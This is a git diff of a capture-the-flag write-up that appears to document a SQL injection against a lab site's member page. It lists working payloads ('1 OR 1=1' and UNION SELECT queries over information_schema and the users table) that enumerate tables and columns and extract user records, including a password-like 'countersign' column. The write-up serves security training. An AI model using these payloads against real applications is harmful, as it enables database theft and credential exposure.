@@ -6,25 +6,30 @@
 ```
 
 ## Discovery
-go to ==> http://{IP_ADDRESS}/index.php?page=member
+go to
+```
+ http://{IP_ADDRESS}/index.php?page=member
+```
+tryed a simple sql statement 
+```
+1 OR 1=1 
+The SQL above is valid and will return ALL rows from the "users" table, since OR 1=1 is always TRUE.
+```
 
+Retrieve columns names with the table they belong to:
+```
+-1 UNION SELECT table_name,concat(column_name) FROM information_schema.COLUMNS 
+```
 
-https://www.sqlinjection.net/table-names/
+Retrieve the id of the user (flag):
+```
+-1 UNION SELECT NULL, user_id FROM users
+```
 
--1 UNION ALL SELECT table_name,concat(column_name) FROM information_schema.COLUMNS 
-
-Get database names:
->Retrieve database names:
->	-1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
->Retrieve tables names:
->	-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Member_Sql_Injection'--
--1 UNION ALL SELECT table_name,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'
-
--1 UNION SELECT username, password FROM db_default WHERE username=admin
--1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users'
--1 UNION SELECT first_name, countersign FROM users
--1 UNION SELECT username, password FROM db_default WHERE user_id=5
-
+started investagting on that user (flag) by geting all its information each time changing col1, col2:
+```
+-1 UNION SELECT [col1_name], [col2_name] FROM db_default WHERE user_id=5
+```
 
 | user_id | first_name | last_name | town | country | planet | commentaire                                                                   | countersign |
 | ------- | ---------- | --------- | ---- | ------- | ------ | ----------------------------------------------------------------------------- | ----------- |
